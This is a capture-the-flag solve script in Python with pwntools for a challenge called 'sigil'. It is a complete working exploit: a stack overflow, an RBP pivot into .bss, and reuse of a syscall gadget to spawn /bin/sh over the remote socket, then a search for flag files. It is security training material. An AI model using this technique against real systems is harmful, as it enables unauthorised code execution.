#!/usr/bin/env python3
# sigil - solve.py
# Bug: listen() reads 0x400 bytes into a 0x40-byte stack buffer, no canary,
# no PIE, no libc, only one syscall gadget (inside sys3()).
#
# Technique: sys3(nr,a,b,c) reloads its 4 args from [rbp-0x18/0x20/0x28/0x30]
# right before `syscall`. By controlling RBP we control rax/rdi/rsi/rdx for
# a syscall of our choice, with no need to know any ASLR'd address, because
# we stage everything through the binary's own fixed (.bss) address.
#
# Stage 1: stack-smash RBP -> 0x404040 (bss) and RET -> 0x401068
#          (mid-`listen`, which does lea rax,[rbp-0x40]; ...; call sys3)
#          => triggers read(0, 0x404000, 0x400): a 2nd read landing at a
#             fixed, known address.
# Stage 2: data placed at 0x404000 makes the fall-through land on
#          0x401014 (sys3's "load regs from rbp, then syscall" gadget)
#          with rax=59 (execve), rdi=&"/bin/sh", rsi=0, rdx=0.
#
# => execve("/bin/sh", NULL, NULL) with fd 0/1 still the socket => shell.

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST = "w01.ctf.chronos-security.ro"
PORT = 39024

BSS                = 0x404000
SYS3_LOAD_SYSCALL  = 0x401014   # mov rax,[rbp-18]; rdi,[rbp-20]; rsi,[rbp-28]; rdx,[rbp-30]; syscall; ...; pop rbp; ret
LISTEN_READ_GADGET = 0x401068   # lea rax,[rbp-0x40]; mov ecx,0x400; mov rdx,rax; mov esi,0; mov edi,0; call sys3

io = remote(HOST, PORT)
io.recvuntil(b"speak the sigil: ")

# ---- stage 1: smash saved rbp/return address of listen() ----
stage1  = b'A' * 0x40
stage1 += p64(BSS + 0x40)           # new RBP  -> rax = rbp-0x40 = 0x404000 (2nd read's dest buf)
stage1 += p64(LISTEN_READ_GADGET)   # new RET  -> re-invokes read(0, 0x404000, 0x400)
io.send(stage1)

time.sleep(0.2)

# ---- stage 2: lands at fixed address 0x404000, build execve("/bin/sh") ----
stage2 = bytearray(0xA0)
stage2[0x40:0x48] = p64(BSS + 0x80)         # F  (next RBP, used by the syscall gadget)
stage2[0x48:0x50] = p64(SYS3_LOAD_SYSCALL)  # jump into sys3's reload+syscall gadget
stage2[0x50:0x58] = p64(0)                  # c -> rdx = 0
stage2[0x58:0x60] = p64(0)                  # b -> rsi = 0
stage2[0x60:0x68] = p64(BSS + 0x90)         # a -> rdi = &"/bin/sh"
stage2[0x68:0x70] = p64(59)                 # nr -> rax = SYS_execve
stage2[0x90:0x98] = b"/bin/sh\x00"
io.send(bytes(stage2))

time.sleep(0.3)
io.sendline(b'cat flag* 2>/dev/null || cat /flag* 2>/dev/null || find / -iname "*flag*" 2>/dev/null')
io.interactive()
